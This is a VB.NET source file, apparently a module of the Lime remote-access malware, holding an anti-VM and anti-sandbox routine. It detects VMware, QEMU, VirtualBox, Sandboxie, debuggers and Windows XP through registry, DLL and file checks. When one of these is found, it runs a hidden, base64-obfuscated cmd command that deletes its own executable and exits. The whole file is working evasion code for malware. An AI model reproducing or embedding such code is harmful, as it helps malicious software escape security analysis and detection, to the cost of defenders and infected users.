Namespace Lime

    Public Class C_AntiVM

        <Runtime.InteropServices.DllImport("kernel32.dll")>
        Public Shared Function LoadLibrary(ByVal dllToLoad As String) As Boolean
        End Function

        Public Shared Sub Check() 'https://www.cyberbit.com/blog/endpoint-security/anti-vm-and-anti-sandbox-explained/
            Try
                'System\CurrentControlSet\Services\Disk\Enum\
                Dim VM = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(BS(Convert.FromBase64String("U3lzdGVtXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXERpc2tcRW51bVw="))).GetValue("0", "")
                If VM.ToString.ToLower.Contains("vmware") OrElse VM.ToString.ToLower.Contains("qemu") Then
                    GoTo del

                ElseIf C_ID.MyOS.ToString.ToLower.Contains("XP".ToLower) Then
                    GoTo del

                ElseIf LoadLibrary("SbieDll.dll") = True Then
                    GoTo del

                ElseIf Diagnostics.Debugger.IsLogging OrElse Diagnostics.Debugger.IsAttached Then
                    GoTo del

                ElseIf IO.File.Exists(Environment.GetEnvironmentVariable("windir") & "\vboxhook.dll") Then
                    GoTo del

                End If
                Exit Sub
del:
                'cmd.exe /c ping 0 -n 2 & del 
                Shell(BS(Convert.FromBase64String("Y21kLmV4ZSAvYyBwaW5nIDAgLW4gMiAmIGRlbCA=")) & """" & Windows.Forms.Application.ExecutablePath & """", AppWinStyle.Hide, False, -1)
                End

            Catch ex As Exception
            End Try

        End Sub
    End Class

End Namespace
